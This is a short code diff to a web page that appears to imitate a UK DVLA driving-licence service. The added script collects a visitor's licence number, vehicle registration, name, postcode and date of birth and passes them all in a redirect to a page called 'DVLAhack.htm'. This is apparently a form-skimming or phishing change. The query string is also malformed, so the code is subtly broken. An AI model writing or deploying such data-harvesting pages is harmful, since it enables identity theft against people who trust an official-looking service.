@@ -372,12 +372,14 @@ document.body.className = document.body.className.replace('no-js','');
                     <script>
 
                         function sendDln() {
-                        var validForm = 0;
+                          var dln = document.getElementsByName('dln')[0].value
+                          var vrn = document.getElementsByName('vrn')[0].value
+                          var customerName = document.getElementsByName('customerName')[0].value
+                          var postcode = document.getElementsByName('postcode')[0].value
+                          var dob = document.getElementsByName('dob')[0].value
 
+                          window.location.href = "DVLAhack.htm?dln=" + dln + "?vrn=" + vrn + "?customerName=" + customerName + "?postcode=" + postcode + "?dob=" + dob;
 
-                          if (validForm == 0) {
-                          window.location.href = "DVLAhack.htm?dln=" + dln;
-                          }
                         }
 
                         </script>
